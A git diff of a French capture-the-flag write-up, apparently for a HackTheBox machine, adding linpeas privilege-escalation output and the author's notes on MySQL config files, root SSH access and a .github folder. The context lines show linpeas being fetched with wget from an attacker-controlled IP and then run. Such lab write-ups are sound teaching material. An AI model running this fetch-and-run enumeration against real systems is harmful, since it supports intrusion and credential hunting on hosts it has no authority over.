@@ -204,6 +204,26 @@ wget 10.10.14.252:8080/linpeas.sh
 chmod +x linpeas.sh
 
 Puis, on va l'exécuter:
-
+```bash
 ./linpeas.sh
 ....
+╔══════════╣ Searching mysql credentials and exec
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
+Found readable /etc/mysql/my.cnf
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+
+╔══════════╣ Analyzing MariaDB Files (limit 70)
+
+-rw------- 1 root root 317 May 13 23:40 /etc/mysql/debian.cnf
+
+╔══════════╣ Analyzing Github Files (limit 70)
+drwxr-xr-x 4 www-data www-data 4096 Mar  4  2023 /var/www/html/crm.board.htb/.github
+
+
+```
+Rien d'intéressant au niveau des cronjobs.
+Il y a une base de données MySQL.
+Root peut se connecter via SSH.
+Il semble y avoir un fichier .github, on peut peut-être explorer les commits.
+
